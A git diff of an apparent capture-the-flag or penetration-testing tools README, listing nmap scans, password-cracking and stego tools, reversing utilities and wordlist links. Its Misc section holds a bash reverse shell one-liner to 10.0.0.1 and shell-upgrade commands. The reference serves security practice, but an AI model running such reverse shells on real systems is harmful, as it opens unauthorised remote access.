@@ -5,7 +5,9 @@ This repo is intended to serve as a list of tools that I've found useful during 
 ## Discovery
 
 ##### Nmap
+Get versions
 `nmap -sC -sV <target>`
+Basic scan all ports
 `nmap -p- <target>`
 
 
@@ -14,10 +16,7 @@ This repo is intended to serve as a list of tools that I've found useful during 
 ##### Gobuster
 
 ## Web
-
 Looks for `sitemap.xml` or `robots.txt`
-
-
 
 ##### Burpsuite
 ##### SQLMap
@@ -26,13 +25,19 @@ Looks for `sitemap.xml` or `robots.txt`
 ## Cracking
 
 ##### John the ripper
+https://countuponsecurity.files.wordpress.com/2016/09/jtr-cheat-sheet.pdf
 ##### Hydra
+https://github.com/frizb/Hydra-Cheatsheet
 ##### PadBuster
 Used to execute and oracle padding attack
+
+##### Hashcat
+https://github.com/frizb/Hashcat-Cheatsheet
 
 ## pwn
 
 ##### pwntools
+https://github.com/Gallopsled/pwntools
 ##### ROP Gadet
 
 ## Forensics
@@ -40,6 +45,13 @@ Used to execute and oracle padding attack
 ##### strings
 ##### Foremost
 ##### Bin Walk
+
+##### Volatility
+The Volatility Framework isfor the
+extraction of digital artifacts from volatile memory (RAM) samples.
+
+https://github.com/volatilityfoundation/volatility
+https://github.com/volatilityfoundation/community
 
 ## Steg
 
@@ -49,17 +61,40 @@ Used to execute and oracle padding attack
 ##### Steg Hide
 ##### zsteg
 ##### jsteg
+##### pngcheck
+
+##### Online tools
+https://stylesuxx.github.io/steganography/
 
 ## Reversing
 
 ##### Radare
+https://github.com/zxgio/r2-cheatsheet/blob/master/r2-cheatsheet.pdf
+
 ##### readelf
+
 ##### checksec
+https://github.com/slimm609/checksec.sh
 ##### angr
 ##### z3
 
 ## Misc
 
+##### Reverse Shell
 `bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`
 `python -c 'import pty; pty.spawn("/bin/sh")'`
 `stty raw -echo`
+
+##### Wordlists
+https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+https://github.com/danielmiessler/SecLists
+
+###### Cewl 
+Wordlist generator
+
+##### Virus total
+https://www.virustotal.com/
+
+##### Have I been Pwned
+https://haveibeenpwned.com/
+
